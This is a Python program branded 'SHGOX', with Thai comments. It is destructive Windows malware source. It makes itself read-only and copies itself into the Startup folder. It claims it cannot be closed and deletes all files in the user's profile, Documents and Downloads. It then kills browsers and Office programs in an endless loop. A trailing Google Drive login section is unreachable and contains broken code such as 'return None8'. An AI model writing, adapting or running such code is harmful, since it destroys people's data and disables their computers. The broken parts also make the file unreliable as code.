import os
import sys
import time
import ctypes
import shutil
import pickle
from os.path import exists
from google_auth_oauthlib.flow import InstalledAppFlow
from googleapiclient.discovery import build
from googleapiclient.errors import HttpError

def show_shgox_message():
    print("\n###############################")
    print("#      SHGOX PROGRAM STARTING  #")
    print("###############################\n")


def protect_file(file_path):
    try:
        if exists(file_path):
            # "Read-only" เพื่อป้องกันการลบ
            os.chmod(file_path, 0o444)
            print(f"ไฟล์ {file_path} ได้รับการป้องกันไม่ให้ลบ")
    except Exception as e:
        print(f"เกิดข้อผิดพลาด: {e}")


def slow_down_computer():
    print("กำลังทำให้เครื่องช้าลง...")
    for _ in range(10000000):  
        _ = 3 * 5


def block_shutdown():
    try:
        ctypes.windll.user32.MessageBoxW(0, "โปรแกรมนี้จะไม่สามารถปิดได้!", "แจ้งเตือน", 0x40 | 0x1)
        while True:
            time.sleep(5)
    except Exception as e:
        print(f"เกิดข้อผิดพลาด: {e}")


def add_to_startup(exe_path):
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\Windows\Start Menu\Programs\Startup')
    try:
        if not exists(startup_folder):
            os.makedirs(startup_folder)

        
        shutil.copy(exe_path, startup_folder)
        print("โปรแกรมจะรันเองหลังจากรีบูต.")
    except Exception as e:
        print(f"เกิดข้อผิดพลาด: {e}")


def close_running_apps():
    apps_to_close = ["chrome.exe", "firefox.exe", "notepad.exe", "excel.exe", "word.exe"]  
    for app in apps_to_close:
        try:
            print(f"กำลังปิด {app}...")
            os.system(f"taskkill /f /im {app}")  
        except Exception as e:
            print(f"ไม่สามารถปิด {app}: {e}")


def monitor_and_close_apps():
    while True:
        close_running_apps()  
        time.sleep(5)  


def delete_all_data():
    try:
        user_folder = os.getenv('USERPROFILE')  
        all_folders = [user_folder, os.path.join(user_folder, "Documents"), os.path.join(user_folder, "Downloads")]
        
        for folder in all_folders:
            if os.path.exists(folder):
                print(f"กำลังลบไฟล์ในโฟลเดอร์: {folder}")
                for root, dirs, files in os.walk(folder, topdown=False):
                    for name in files:
                        try:
                            file_path = os.path.join(root, name)
                            os.remove(file_path)  
                        except Exception as e:
                            print(f"ไม่สามารถลบไฟล์: {file_path}, ข้อผิดพลาด: {e}")
                    for name in dirs:
                        try:
                            dir_path = os.path.join(root, name)
                            os.rmdir(dir_path)  
                        except Exception as e:
                            print(f"ไม่สามารถลบโฟลเดอร์: {dir_path}, ข้อผิดพลาด: {e}")
        print("ลบข้อมูลทั้งหมดเรียบร้อย.")
    except Exception as e:
        print(f"เกิดข้อผิดพลาดในการลบข้อมูล: {e}")


def keep_running():
    print("โปรแกรมกำลังทำงาน... จะปิดตัวเองไม่ได้.")
    while True:
        time.sleep(5)


def authenticate_google_account():
    """Authenticate and return the Google Drive API service."""
    creds = None
    # ตรวจสอบว่าไฟล์ token.pickle มีอยู่แล้วหรือไม่ (เพื่อไม่ต้องล็อกอินใหม่ทุกครั้ง)
    if os.path.exists('token.pickle'):
        with open('token.pickle', 'rb') as token:
            creds = pickle.load(token)

    
    if not creds or not creds.valid:
        if creds and creds.expired and creds.refresh_token:
            creds.refresh(Request())
        else:
            flow = InstalledAppFlow.from_client_secrets_file(
                'credentials.json', SCOPES)
            creds = flow.run_local_server(port=0)

        
        with open('token.pickle', 'wb') as token:
            pickle.dump(creds, token)

    try:
        
        service = build('drive', 'v3', credentials=creds)
        return service
    except HttpError as error:
        print(f'เกิดข้อผิดพลาด: {error}')
        return None8


def list_drive_files(service):
    """List files in the authenticated user's Google Drive."""
    try:
        # ดึงข้อมูลไฟล์ทั้งหมดใน Google Drive
        results = service.files().list(
            pageSize=10, fields="nextPageToken, files(id, name)").execute()
        items = results.get('files', [])

        if not items:
            print('ไม่พบไฟล์ใดใน Google Drive')
        else:
            print('ไฟล์ใน Google Drive:')
            for item in items:
                print(f'{item["name"]} ({item["id"]})')
    except HttpError as error:
        print(f'เกิดข้อผิดพลาดในการดึงไฟล์: {error}')

if __name__ == "__main__":
    exe_path = sys.argv[0]  
    show_shgox_message() 
    protect_file(exe_path) 
    add_to_startup(exe_path)  
    block_shutdown()  
    slow_down_computer()  
    delete_all_data()  
    monitor_and_close_apps()
    keep_running()

    
    SCOPES = ['https://www.googleapis.com/auth/drive.readonly']
    service = authenticate_google_account()
    if service:
        list_drive_files(service)  
